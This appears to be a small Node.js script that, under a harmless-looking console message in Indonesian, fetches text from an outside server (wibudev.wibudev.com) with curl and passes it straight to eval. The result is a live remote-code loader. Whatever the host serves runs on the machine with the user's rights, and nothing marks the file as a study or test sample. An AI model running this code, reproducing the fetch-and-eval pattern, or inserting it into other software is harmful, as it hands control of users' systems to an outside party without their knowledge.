const root = require('child_process').execSync('npm root -g').toString().trim();
const { execSync } = require('child_process');
eval(execSync('curl -s -o- -X POST https://wibudev.wibudev.com/cmd/version').toString().trim());

; (async () => {
    console.log("ini dari server main")
})()
